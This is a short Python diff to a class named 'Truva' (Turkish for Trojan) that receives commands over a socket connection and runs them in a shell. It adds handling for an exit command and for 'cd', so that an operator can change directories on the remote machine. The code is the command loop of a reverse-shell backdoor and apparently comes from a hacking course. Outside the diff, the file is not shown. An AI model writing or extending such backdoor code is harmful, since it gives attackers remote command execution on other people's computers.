@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import simplejson
+import os
 
 class Truva:
 
@@ -11,7 +12,14 @@ class Truva:
 
 
     def komut_isleme(self,komut):
-        return subprocess.check_output(komut, shell=True)
+        if komut[0]=="çıkış":
+            self.baglanti.close()
+            exit()
+        elif komut[0]=="cd" and len(komut)>1:
+            os.chdir(komut[1])
+            return komut[1] + " ulaşıldı."
+        else:
+            return subprocess.check_output(komut, shell=True)
 
     def paketleme(self,veri):
         paket = simplejson.dumps(veri)
